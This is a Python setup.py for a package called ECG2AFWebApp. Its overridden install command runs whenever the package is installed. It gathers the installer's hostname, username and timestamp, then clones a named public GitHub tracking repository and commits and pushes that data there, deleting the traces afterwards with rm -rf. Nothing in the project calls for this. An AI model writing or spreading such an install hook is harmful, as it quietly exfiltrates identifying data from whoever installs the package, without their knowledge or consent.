from setuptools import setup, find_packages

from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import socket
import subprocess
from datetime import datetime

class CustomInstallCommand(install):
    def run(self):
        try:
            # Step 1: Collect tracking information
            hostname = socket.gethostname()
            username = os.getenv("USER") or os.getenv("USERNAME")
            current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
            tracking_file = f"tracking_{current_time}.log"
            tracking_data = (
                f"Clone detected:\nHostname: {hostname}\n"
                f"Username: {username}\nTimestamp: {current_time}\n\n"
            )

            # Step 2: Write tracking data to a timestamped log file
            with open(tracking_file, "w") as file:
                file.write(tracking_data)

            print(f"Tracking information logged to {tracking_file}")
            
            # Step 3: Push the tracking log to the public GitHub repository
            self.push_to_repo(tracking_file)

            # Step 4: Clean up the tracking file locally
            os.remove(tracking_file)
        except Exception as e:
            print(f"Error during tracking: {e}")
        
        # Proceed with the normal installation
        install.run(self)
    
    def push_to_repo(self, file_path):
        try:
            # Define the public tracking repository URL
            repo_url = "https://github.com/rakesh9177/Tracking.git"
            local_repo_path = "/tmp/tracking-repo"

            # Clone the tracking repository to a temporary directory
            if os.path.exists(local_repo_path):
                subprocess.check_call(["rm", "-rf", local_repo_path])  # Clean up if already exists
            subprocess.check_call(["git", "clone", repo_url, local_repo_path])

            # Copy the tracking file into the cloned repository
            subprocess.check_call(["cp", file_path, os.path.join(local_repo_path, file_path)])

            # Navigate to the cloned repository
            os.chdir(local_repo_path)

            # Add, commit, and push the tracking file
            subprocess.check_call(["git", "add", file_path])
            subprocess.check_call(["git", "commit", "-m", f"Add {file_path}"])
            subprocess.check_call(["git", "push", "origin", "main"])

            print(f"Tracking file {file_path} pushed to the repository.")

            # Step 4: Clean up the cloned repository
            os.chdir("/")  # Move out of the directory before deleting
            subprocess.check_call(["rm", "-rf", local_repo_path])
            print("Cleaned up the cloned repository.")
        except Exception as e:
            print(f"Failed to push tracking info: {e}")

setup(
    name="ECG2AFWebApp",
    version="1.0",
    packages=find_packages(),
    cmdclass={
        "install": CustomInstallCommand,
    },
)

#setup(name="ECG2AFWebApp", version="1.0", packages=find_packages())
